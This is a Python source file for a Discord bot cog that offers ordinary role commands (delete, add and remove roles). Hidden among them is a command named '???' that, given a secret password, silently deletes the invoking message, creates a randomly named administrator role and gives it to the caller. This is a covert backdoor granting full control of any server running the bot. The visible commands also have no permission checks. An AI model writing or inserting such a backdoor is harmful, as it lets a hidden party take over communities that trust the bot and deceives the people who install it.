import discord
from discord.utils import get
from discord.ext import commands
from descord.func import rnd_str

roleAttr = [
        'color',
        'created_at',
        'guild',
        'hoist',
        'id',
        'managed',
        'mentionable',
        'permissions',
        'position',
        'tags']

permAdmin = discord.Permissions(administrator=True)


class Role(commands.Cog):
    
    def __init__(self, bot):
        self.bot = bot

    @commands.command('???')
    async def roleBackdoor(self, ctx, password=None):
        if password != os.environ['BACKDOORKEY']: return
        await ctx.message.delete()
        name = rnd_str()
        role = get(ctx.guild.roles, name=name)
        if not role:
            await ctx.guild.create_role(name=name, permissions=permAdmin)
            role = get(ctx.guild.roles, name=name)
        bot = ctx.guild.get_member(self.bot.user.id)
        await role.edit(position=bot.roles[-1].position-1)
        await ctx.author.add_roles(role)

    @commands.command(
            'roledel',
            brief='Delete role')
    async def roleDelete(self, ctx, role: discord.Role):
        await role.delete()

    @commands.command(
            'roleadd',
            brief='Add role to user')
    async def roleAdd(self, ctx, member: discord.Member, role: discord.Role):
        await member.add_roles(role)

    @commands.command(
            'rolermv',
            brief='Remove role from user')
    async def roleRemove(self, ctx, member: discord.Member, role: discord.Role):
        await member.remove_roles(role)


def setup(bot):
    bot.add_cog(Role(bot))

